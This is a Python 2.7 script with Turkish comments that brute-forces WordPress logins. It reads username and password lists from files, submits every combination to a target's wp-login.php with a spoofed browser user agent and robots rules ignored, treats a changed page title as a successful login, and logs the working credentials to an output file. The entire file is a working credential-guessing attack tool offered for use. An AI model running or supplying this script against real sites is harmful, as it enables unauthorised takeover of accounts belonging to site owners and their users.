#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

import mechanize

class Tarayici(object):
	def __init__(self):
		self.br = mechanize.Browser()
		self.br.set_handle_robots(False)
		self.br.addheaders = [("User-agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A"),
		("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
		("Content-type","application/x-www-form-urlencoded; charset=UTF-8")]
		self.red = "\033[31m" # kırmızı
		self.white = "\033[97m" # beyaz
		self.reset = "\033[0m" # resetleme
		self.bold = "\033[1m" # koyu yazma
		self.underline = "\033[4m" # alt yazili yazma
		## dosya işlemleri
		self.dosya = open("user.txt","r")
		self.userid = []
		self.userid = self.dosya.read().split("\n")
		self.userid.remove("")
		self.dosya.close()
		######################
		self.passid = []
		self.dosya = open("pass.txt","r")
		self.passid = self.dosya.read().split("\n")
		self.passid.remove("")
		self.dosya.close()
	def attackWordpress (self,link,log,pwd):
		self.site = "http://www."+link+"/wp-login.php"
		#self.br.open("http://"+link+"/wp-login.php")
		# except:
		# 	self.site = "https://"+link+"/wp-login.php"
		self.br.open(self.site)
		self.first_title = self.br.title()
		self.br.select_form(nr=0)
		self.br["log"] = log
		self.br["pwd"] = pwd
		self.br.submit()
		if self.first_title == self.br.title():
			print self.bold+self.red+"[!] FALSE >> "+log+" : "+pwd+" ---> "+link+self.reset
			return 0
		else:
			print self.bold+self.white+"[+] TRUE >> "+log+" : "+pwd+" --->"+link+self.reset
			return 1
	def run(self,link,output):
		self.dosya = open(output,"a+")
		try:
			for username in self.userid:
				for userpass in self.passid:
					x = self.attackWordpress(link,username,userpass)
					if x == 1:
						self.dosya.write("[+] "+link+" >> "+username+" : "+userpass)
		except Exception,e:
			print e
			print self.underline+"[?] Pass > "+self.site+self.reset
		self.dosya.close()
# calistir = Tarayici().run("localhost/wordpress/","output.txt")
